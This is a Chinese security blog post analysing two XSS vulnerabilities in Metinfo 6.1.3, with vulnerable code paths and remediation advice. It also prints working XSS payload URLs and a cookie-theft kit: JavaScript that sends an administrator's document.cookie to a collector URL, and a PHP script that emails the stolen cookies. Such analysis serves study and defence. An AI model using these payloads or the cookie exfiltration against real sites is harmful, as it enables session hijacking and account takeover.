> 原文链接: https://www.anquanke.com//post/id/173064 


# Metinfo 6.1.3 XSS漏洞分析


                                阅读量   
                                **239317**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0144db68171a5a9be1.png)](https://p0.ssl.qhimg.com/t0144db68171a5a9be1.png)



## 前言

前段时间看到一个cms造成的xss漏洞，这里想分析下。这个漏洞是metinfo6.1.3版本因参数问题造成前台和后台引起了两处xss漏洞。

这个漏洞的影响范围一直到最新版本（6.1.3），因为前段时间爆出的漏洞，所以新版本应该已修复。

cms最新6.13下载地址：[https://www.mituo.cn/download/](https://www.mituo.cn/download/)



## 前台漏洞分析（ CVE-2018-20486）

通过在前台插入xss访问，然后会在后台触发xss，造成xss攻击。

漏洞的触发点在admin/login/login_check.php

[![](https://p0.ssl.qhimg.com/t017a8936ce551ccf27.png)](https://p0.ssl.qhimg.com/t017a8936ce551ccf27.png)

这里加载了$commonpath=$depth.’include/common.inc.php’，然后在如下的代码段里存在变量覆盖漏洞： （admin/include/common.inc.php 77行）

[![](https://p5.ssl.qhimg.com/t01bcc67088f0c3b377.png)](https://p5.ssl.qhimg.com/t01bcc67088f0c3b377.png)

然后往下分析，回头看admin/login/login_check.php这段代码

[![](https://p4.ssl.qhimg.com/t01161bd86b10998cdc.png)](https://p4.ssl.qhimg.com/t01161bd86b10998cdc.png)

$url_array变量是我们可控的，从而控制$truefile变量，进入下个if语句，if语句中存在更改数据库信息的mysql语句，从而可以直接更改数据库信息

$_M 数组是一个包含了网站设置，系统调用等信息的总和数组，具体内容如下：

```
$_M[config]：网站配置数组，里面可以查询到所有的网站配置数据。
    $_M[form]：提交的GET,POST,COOKIE表单数组。在系统中不要直接使用$_POST,$_GET,$_COOKIE,
        这些都是没有过滤的，$_M[form]中是已经安全过滤后的数组。
    $_M[langlist]：语言设置数组，其中$_M[langlist][web]为前台语言设置，
            $_M[langlist][admin]为后台语言设置。
    $_M[lang]：前台语言，如果你是在网站前台，则这个值是你当前访问的语言，
        如果是后台，则这个值是你当前编辑的语言。
    $_M[table]：系统表名称。
    $_M[url]：系统一些常用URL入口地址。
    $_M[url][site_admin] ：网站后台地址
    $_M[url][site] ：网站前台地址
    $_M[url][entrance] ：框架入口地址
    $_M[url][own] ：当前执行的应用根目录地址
    $_M[url][app] ：应用根目录地址
    $_M[url][pub] ：系统公用文件（html.css,js）地址
    $_M[url][ui] ：当前class所使用的UI地址，前台为“系统ui根目录/web”;，
                    后台为“系统ui根目录/admin”。
    $_M[user][cookie]：用户cookie信息，建议不要直接取值，使用get_met_cookie()取值。
    $_M[word]：当前的语言参数。
    $_M[plugin]：系统插件数组。
```

然后在 app/system/include/class/common.class.php中

```
$_M['config']['met_adminfile_code'] = $_M['config']['met_adminfile'];
        $_M['config']['met_adminfile'] = authcode($_M['config']['met_adminfile'],'DECODE', $_M['config']['met_webkeys']);
        if ($_M['config']['met_adminfile'] == '') `{`
            $_M['config']['met_adminfile'] = 'admin';
            $met_adminfile = authcode($_M['config']['met_adminfile'],'ENCODE', $_M['config']['met_webkeys']);
            $query = "UPDATE `{`$_M['config']['tablepre']`}`config SET `value` = '$met_adminfile' where `name`='met_adminfile'";
            $result = DB::query($query);
        `}`
```

我们可以看到，met_adminfile是我们可控的值存在于$_M[‘config’][‘met_adminfile’]中，也就是通过这个就可以找到我们可以构造的点了。

[![](https://p2.ssl.qhimg.com/t017ac5b4b0d5c5c115.png)](https://p2.ssl.qhimg.com/t017ac5b4b0d5c5c115.png)

看到这里就会发现离我们可构造的XSS不远了，这段存在于app/system/safe/admin/templates/index.php (72行)，可以发现，这里标签直接输出了met_adminfile的值，因此造成了一个存储型的XSS漏洞。

xss payload:

```
http://127.0.0.1/metinfo6.13/admin/login/login_check.php?url_array[]=1&amp;url_array[]=1&amp;url_array[]=aa" onfocus=alert(/xss/) &amp;url_array[]=1
```

然后直接访问，无回显。

这时登录后台，点击安全与效率页面

[![](https://p4.ssl.qhimg.com/t0176c8f6cf0c0b710c.png)](https://p4.ssl.qhimg.com/t0176c8f6cf0c0b710c.png)

[![](https://p5.ssl.qhimg.com/t0148c70656db0f0ef8.png)](https://p5.ssl.qhimg.com/t0148c70656db0f0ef8.png)

点击后台文件夹的文件名即可触发xss。其实可以发现后台文件名已经被更改了，并插入了xss代码。每当更改文件名时便会触发xss，这里就是通过更改参数的值传进数据库，从而更新了文件名。

我们可以通过这个存储型XSS漏洞去拿管理员cookie。

获取cookie-payload:

```
&lt;?php
$cookie = $_GET['joke'];
if(isset($_GET['joke']))
`{`
$to = "xxxxxxx@qq.com";         // 邮件接收者
$subject = "COOKIE";                // 邮件标题
$message = $_GET['joke'];  // 邮件正文
$from = "xxxxxxx@qq.com";   // 邮件发送者
$headers = "From:" . $from;         // 头部信息设置
mail($to,$subject,$message,$headers);
echo "邮件已发送";
`}`
else
    echo "邮件发送失败";
?&gt;
```

```
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://localhost/Myphp/eamil/eamil0.php?joke='+encodeURIComponent(document.cookie);//这里是用本地环境测试的，可以换成自己的ip地址
```

js脚本获取cookie内容，然后将cookie赋予php脚本变量中，然后获取变量内容，发送邮件到自己邮箱。

发送邮箱需配置smtp服务，具体可以参考我这篇文章[https://www.jianshu.com/p/4afafc3c5a3e](https://www.jianshu.com/p/4afafc3c5a3e)



## 后台漏洞分析（CVE-2018-19835）

后台也是由于参数问题造成的xss漏洞，不过这个目录只能在后台访问。

先看造成漏洞的主要代码块（/admin/column/move.php）：

[![](https://p1.ssl.qhimg.com/t01fb4e50908314859e.png)](https://p1.ssl.qhimg.com/t01fb4e50908314859e.png)

从代码中可以看出只需要$folderyanzheng&gt; 0进入if判断内，再看第二个if语句，要保证$folder_m不为空，因此我们可以随便查询一个数据库，也就是给变量$foldername赋一个数据库名。然后将$lang_columnerr4赋给$metcms,最后输出$metcms，也就造成了xss。

查询数据库如下：

[![](https://p0.ssl.qhimg.com/t0160fbde57891a5236.png)](https://p0.ssl.qhimg.com/t0160fbde57891a5236.png)

不过从这里可以看出造成这个xss攻击代价太大，不仅要知道后台权限，还要知道一个数据库名。感觉可用性并不是太强。

### <a name="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"></a>漏洞复现

Xss-Payload:

```
http://127.0.0.1/metinfo6.13/admin/column/move.php?foldyanzheng=1&amp;foldername=search&amp;lang_columnerr4=&lt;Script&gt;alert(/xss/)&lt;/sCript&gt;&amp;metcms=1
```

[![](https://p4.ssl.qhimg.com/t017c0b00a09cc1a23d.png)](https://p4.ssl.qhimg.com/t017c0b00a09cc1a23d.png)

这里我们可以看出它会将信息最终通过metcms参数输出在页面中，因此也就造成了xss。

[![](https://p1.ssl.qhimg.com/t01f04093d42f2b84e7.png)](https://p1.ssl.qhimg.com/t01f04093d42f2b84e7.png)



## 总结

修复建议： 因为最新版本应该已经修复相关漏洞，可以升级为新版本。

metinfo出现的xss漏洞较多，但xss在能够利用的情况下产生的危害也较大，因此在开发时应考虑到造成漏洞的不同场景，尽可能的避免漏洞存在。针对XSS最常见的可以对输入(和URL参数)进行过滤，对输出进行编码，也可以对关键字进行黑名单或白名单的过滤等等。

以上分析仅为个人理解，如有不足之处还请大佬们指点。

参考文章：[Metinfo前台XSS漏洞分析 CVE-2018-20486](https://mp.weixin.qq.com/s?__biz=MzI0Nzc0NTcwOQ==&amp;mid=2247484411&amp;idx=1&amp;sn=46f4e1c99a22adb6faf15d05c4ea17d9&amp;chksm=e9aa1e39dedd972ffdba44875e59175e753f5d4d050c95a298a4fa70e75c7c33d570112fdcec&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1548610288&amp;ascene=7&amp;devicetype=android-27&amp;version=2700003c&amp;nettype=3gnet&amp;abtest_cookie=BQABAAoACwASABMAFAAGACOXHgBXmR4Am5keAJ2ZHgCzmR4A0pkeAAAA&amp;lang=zh_CN&amp;pass_ticket=K3YlNukD0anrGXdztX3Gp0N%2FtlGlThFaU%2BKcGr3Kd3sfVbfNh0CLzWQS0hORsvr2&amp;wx_header=1)
